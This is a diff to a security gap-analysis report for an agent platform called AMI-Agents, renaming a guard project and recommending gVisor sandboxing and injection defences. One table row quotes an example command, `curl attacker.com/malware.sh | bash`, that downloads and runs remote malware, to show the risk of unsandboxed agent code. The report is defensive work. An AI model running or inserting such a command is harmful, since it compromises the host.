@@ -55,7 +55,7 @@ This matrix compares AMI-Agents' current codebase-verified state against the bes
 
 AMI's current state is anchored to specific codebase files:
 - `ami/core/policies/engine.py` — YAML policy loading (165 lines)
-- `projects/RUST-GUARD/` — SUID binary hardening, agent sandbox escape research
+- `projects/WORKSPACE-GUARD/` — SUID binary hardening, agent sandbox escape research
 - `docs/specifications/SPEC-HOOKS.md` — Hook validation pipeline v4.0.0 + Phase 2 design
 - `projects/docs/AMI-AGENTS-OVERVIEW.md` — Enterprise compliance posture
 - `README.md` — "federated, hard-walled infrastructure"
@@ -67,7 +67,7 @@ AMI's current state is anchored to specific codebase files:
 | Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
 |---|---|---|---|---|---|
 | Approach | Google: Confidential VMs + Model Armor; Apple: PCC with verifiable transparency (stateless, no SSH, Secure Boot); OpenAI: SandboxAgent (beta Apr 2026, isolated Linux envs with manifest contracts); Anthropic: Managed Agents API with `limited` networking mode | NeMo Guardrails: Colang-based dialog/tool rails; Semantic Kernel: 3 filter types (function, prompt, auto-invocation); Galileo: Agent Control open-source (early) | CoreWeave: DPU-level bare metal isolation, single-tenant nodes, Kata Containers, NVIDIA CC GPU TEE; Fireworks: BYOC/airgapped (AWS EKS, no metadata sent); Modal: gVisor sandbox (userspace kernel, no host kernel syscalls) | Fail-closed command hooks; SUID binary guards (git-guard, podman-guard); no agent-level sandboxing; no gVisor/Kata/Firecracker integration; no container isolation for agent code | **CRITICAL** — No sandboxed execution environment for LLM-generated code. AMI agents run with host-level privileges. No TEE/Confidential Computing integration. No process-level isolation between agent and host. The PocketOS pattern (agent deletes production DB) is fully replicable in current AMI. |
-| Code path | N/A | N/A | N/A | `projects/RUST-GUARD/` provides binary-level git isolation but not runtime sandboxing. `ami/core/guards.py` provides command classification but no execution sandbox. | New module: `ami/core/runtime/sandbox.py` — gVisor wrapper for agent code execution. New file: `ami/core/agents/manifest.py` — workspace contract (read-only by default, explicit grants). |
+| Code path | N/A | N/A | N/A | `projects/WORKSPACE-GUARD/` provides binary-level git isolation but not runtime sandboxing. `ami/core/guards.py` provides command classification but no execution sandbox. | New module: `ami/core/runtime/sandbox.py` — gVisor wrapper for agent code execution. New file: `ami/core/agents/manifest.py` — workspace contract (read-only by default, explicit grants). |
 
 #### 2.2.2 Policy Enforcement (Command Tiers, Tool Restrictions)
 
@@ -131,7 +131,7 @@ AMI's current state is anchored to specific codebase files:
 
 | Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
 |---|---|---|---|---|---|
-| Approach | OpenAI: SandboxAgent (beta Apr 2026 — manifest-based workspace contracts); Google: gVisor for Cloud Run; AWS: Firecracker microVMs (125ms boot, ~5MB memory, KVM-based, zero known VM escape CVEs) | Modal: gVisor sandbox (SOC 2, HIPAA, 100x faster than VMs); Beam: gVisor (open-source AGPL-3.0, self-hostable) | CoreWeave: DPU-enforced isolation + Kata Containers option; NVIDIA: Confidential Containers (Kata + TDX/SEV-SNP + H100 CC); Fireworks: BYOC airgapped (no metadata sent) | git-guard and podman-guard binary wrappers — compiled SUID-root enforcement for git ops and container management. No sandboxed execution environment for agent-generated code. No container isolation for agent runtime. No GPU sandboxing. | **CRITICAL** — No code execution sandboxing. An LLM that generates `os.system("curl attacker.com/malware.sh | bash")` executes with full host privileges. RUST-GUARD RESEARCH.md documents gVisor, Firecracker, and Kata as recommendations — none are implemented. |
+| Approach | OpenAI: SandboxAgent (beta Apr 2026 — manifest-based workspace contracts); Google: gVisor for Cloud Run; AWS: Firecracker microVMs (125ms boot, ~5MB memory, KVM-based, zero known VM escape CVEs) | Modal: gVisor sandbox (SOC 2, HIPAA, 100x faster than VMs); Beam: gVisor (open-source AGPL-3.0, self-hostable) | CoreWeave: DPU-enforced isolation + Kata Containers option; NVIDIA: Confidential Containers (Kata + TDX/SEV-SNP + H100 CC); Fireworks: BYOC airgapped (no metadata sent) | git-guard and podman-guard binary wrappers — compiled SUID-root enforcement for git ops and container management. No sandboxed execution environment for agent-generated code. No container isolation for agent runtime. No GPU sandboxing. | **CRITICAL** — No code execution sandboxing. An LLM that generates `os.system("curl attacker.com/malware.sh | bash")` executes with full host privileges. WORKSPACE-GUARD RESEARCH.md documents gVisor, Firecracker, and Kata as recommendations — none are implemented. |
 
 #### 2.2.12 Runtime Guardrail Enforcement
 
@@ -177,7 +177,7 @@ AMI leads only in EU sovereignty (tied with neoclouds) — every other dimension
 
 | Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
 |---|---|---|---|---|---|
-| **AGENT-1** | No agent-level sandboxing. AMI commands run directly on host OS. No gVisor, Kata, Firecracker, or container isolation for LLM-generated code execution. RUST-GUARD RESEARCH.md documents need for gVisor/Firecracker but has zero implementation. | Critical | WS-1 (OpenAI SandboxAgent), WS-3 (Modal gVisor, CoreWeave DPU/Kata), WS-5 (§2.3: Omega, seL4, Firecracker) | **P0 — Immediate** | Integrate gVisor sandboxing for agent code execution (reference: Modal/Beam, gVisor GPU nvproxy). Create `ami-sandbox` runtime that wraps execution. Network blocked by default. Workspace read-only by default. Explicit grants for write/network. |
+| **AGENT-1** | No agent-level sandboxing. AMI commands run directly on host OS. No gVisor, Kata, Firecracker, or container isolation for LLM-generated code execution. WORKSPACE-GUARD RESEARCH.md documents need for gVisor/Firecracker but has zero implementation. | Critical | WS-1 (OpenAI SandboxAgent), WS-3 (Modal gVisor, CoreWeave DPU/Kata), WS-5 (§2.3: Omega, seL4, Firecracker) | **P0 — Immediate** | Integrate gVisor sandboxing for agent code execution (reference: Modal/Beam, gVisor GPU nvproxy). Create `ami-sandbox` runtime that wraps execution. Network blocked by default. Workspace read-only by default. Explicit grants for write/network. |
 | **AGENT-2** | No tool-use restriction framework. AMI's command-tier controls shell commands but has no mechanism to intercept, validate, or restrict LLM tool calls. The excessive agency (OWASP LLM06) pattern is unmitigated. | Critical | WS-1 (Google Agent Identity, Anthropic permissions, OpenAI tool guardrails), WS-2 (NeMo tool rails, Semantic Kernel filters), WS-5 (§2.3: AgentBound) | **P0 — Immediate** | Build tool-call interception pipeline: schema validation, parameter bounds, permission check, output taint. Reference: AgentBound (arXiv 2510.21236). Create `ami/core/agents/tools/validator.py`. |
 | **AGENT-3** | No prompt injection detection. No content filter for LLM inputs/outputs. No jailbreak classifier, no injection detector, no structured query protocol. 21 hard deny patterns operate at shell syntax level, not LLM I/O level. | Critical | WS-1 (Meta Prompt Guard 2, Google Model Armor, Anthropic Constitutional Classifiers), WS-2 (Lakera 95.22% PINT), WS-5 (§2.2: 23 papers on prompt injection) | **P0 — Immediate** | Two-layer defence: (1) Semantic virtualization (Guest/Visor split per AgentVisor arXiv 2604.24118), (2) Prompt injection classifier (Lakera Guard API or local Prompt Guard 2). Create `ami/core/security/visor.py` and `ami/core/security/injection_detector.py`. |
 | **AGENT-4** | No agent-to-agent security. Single-agent sessions only. No A2A protocol, no inter-agent trust model, no agent identity system. A2A v1.0 has zero built-in PI defences (Grith Security, 2026). | Critical | WS-1 (Anthropic handoff, Google A2A), WS-5 (§2.4: papers 58–65), WS-6 (§5.1) | **P1 — Q4 2026** | Implement A2A with mandatory security: Agent Card signing (Ed25519), session integrity, ephemeral scoped tokens (arXiv 2505.12490), semantic firewalls. Create `ami/core/a2a/`. |
@@ -342,7 +342,7 @@ AMI leads only in EU sovereignty (tied with neoclouds) — every other dimension
 
 **What:** When agents execute LLM-generated code, run in gVisor sandbox (Sentry userspace kernel intercepts syscalls). Network blocked by default. Workspace read-only by default. Explicit grant system. `ami-sandbox` CLI wrapper.
 
-**Why:** PocketOS (Apr 2026) and Kiro (Feb 2025) incidents both involved agents executing code with host-level privileges. gVisor sandboxing prevents "delete everything" regardless of LLM instructions because sandboxed processes cannot make host kernel syscalls. Consensus (RUST-GUARD RESEARCH.md §5) recommends gVisor/Firecracker for untrusted code.
+**Why:** PocketOS (Apr 2026) and Kiro (Feb 2025) incidents both involved agents executing code with host-level privileges. gVisor sandboxing prevents "delete everything" regardless of LLM instructions because sandboxed processes cannot make host kernel syscalls. Consensus (WORKSPACE-GUARD RESEARCH.md §5) recommends gVisor/Firecracker for untrusted code.
 
 **Technical design:**
 - gVisor binary (`runsc`) bootstrapped into `.boot-linux/bin/`
@@ -1253,7 +1253,7 @@ Four engineering tracks running in parallel, synchronized at 2-week sprint bound
 |---|---|---|---|---|---|
 | Guardrails | ✅ Bedrock, Vertex, Purview, CoPilot | ✅ NeMo, Guardrails AI, Lakera | ❌ None | ✅ Semantic visor + tool interception + injection detection | ❌ Hooks pipeline only (no security primitives) |
 | Orchestration | ✅ Vertex AI, Copilot Studio | ✅ LangChain, CrewAI, AutoGen | ❌ None | ✅ A2A + multi-agent + agent eval | ⚠️ Single-agent only |
-| Infrastructure security | ✅ VPC, CMEK, VNet, C3 | ❌ None | ✅ DPU, gVisor, CC, Firecracker | ✅ gVisor + CC + seccomp + loadouts | ⚠️ RUST-GUARD research only |
+| Infrastructure security | ✅ VPC, CMEK, VNet, C3 | ❌ None | ✅ DPU, gVisor, CC, Firecracker | ✅ gVisor + CC + seccomp + loadouts | ⚠️ WORKSPACE-GUARD research only |
 | Compliance evidence | ✅ SOC/ISO reports, Artifact | ✅ SOC 2 docs | ✅ SOC/ISO reports | ✅ ISO 27001 + SOC 2 + ISO 42001 | ❌ Zero certifications |
 | Data sovereignty | ✅ Assured Workloads, Azure EU | ✅ Mistral EU, Aleph DC | ✅ Scaleway, Hetzner | ✅ Local-first: no SaaS, no telemetry | ✅ Local-first already |
 | Platform lock-in | 🔒 High | 🔄 Varies | 🔄 Varies | 🔓 Any LLM, any infra, any framework | 🔓 Any LLM, any infra, any framework |
@@ -1270,7 +1270,7 @@ Four engineering tracks running in parallel, synchronized at 2-week sprint bound
 | Audit trail | Mutable session transcripts | Hash-chain audit log with append, replay, verify, SIEM export |
 | Stop button / reversal | None | Safe halt from any yield point; action reversal with checkpoint |
 | Code execution safety | Host-level (no sandbox) | gVisor sandbox with blocked network; read-only workspace |
-| Sandbox escape research | Research document (RUST-GUARD) | Production sandbox with escape test suite |
+| Sandbox escape research | Research document (WORKSPACE-GUARD) | Production sandbox with escape test suite |
 | Agent identity | None | Signed agent manifests; A2A mutual authentication |
 | Multi-agent security | None | Delegation depth tracking; circular detection; A2A security protocol |
 | Behaviour drift detection | None | ProbGuard: behavioural profiles, deviation alerts within 38s |
@@ -1334,7 +1334,7 @@ AMI's window of opportunity is real but finite. Every major incident (PocketOS, 
 
 3. **Multi-agent security built-in, not bolted-on** — A2A security cannot be an afterthought. The damage from an insecure multi-agent ecosystem dwarfs single-agent incidents. Build it right from the start.
 
-The AMI codebase has the right bones — SPEC-HOOKS.md shows architectural foresight, RUST-GUARD shows research depth, and the local-first/open-source posture is strategically correct. But there is a gap between architectural vision and production reality.
+The AMI codebase has the right bones — SPEC-HOOKS.md shows architectural foresight, WORKSPACE-GUARD shows research depth, and the local-first/open-source posture is strategically correct. But there is a gap between architectural vision and production reality.
 
 **Close that gap in the next 10 weeks. Then build the moat. Then certify the platform.**
 
@@ -1348,7 +1348,7 @@ The AMI codebase has the right bones — SPEC-HOOKS.md shows architectural fores
 - *WS-5: Academic Landscape (84 papers annotated, arXiv 2024–2026)*
 - *WS-6: Incidents & Milestones (25+ documented incidents, benchmarks)*
 
-*Anchored to AMI codebase: ami/core/policies/engine.py, projects/RUST-GUARD/, docs/specifications/SPEC-HOOKS.md, projects/docs/AMI-AGENTS-OVERVIEW.md, README.md*
+*Anchored to AMI codebase: ami/core/policies/engine.py, projects/WORKSPACE-GUARD/, docs/specifications/SPEC-HOOKS.md, projects/docs/AMI-AGENTS-OVERVIEW.md, README.md*
 
 *Research period: Jun 2026 | Analyst: AI Agent | Review cycle: Continuous*
 
@@ -1737,7 +1737,7 @@ LLM (Guest)           Trusted Visor               Host (Environment)
 - Integrate policy evaluation with tool-call interception permissions
 - Wrap evaluate_all with audit entry creation
 
-### D.2 projects/RUST-GUARD/
+### D.2 projects/WORKSPACE-GUARD/
 
 | Aspect | Finding | Impact |
 |---|---|---|
@@ -1749,7 +1749,7 @@ LLM (Guest)           Trusted Visor               Host (Environment)
 **Action items:**
 - Port SUID hardening findings to AMI sandbox escape test suite
 - Integrate security profile analyzer as `ami security audit` command
-- Apply RUST-GUARD pre-commit discipline to AMI main repo
+- Apply WORKSPACE-GUARD pre-commit discipline to AMI main repo
 - Use sandbox escape research as pen test checklist for gVisor integration
 
 ### D.3 docs/specifications/SPEC-HOOKS.md
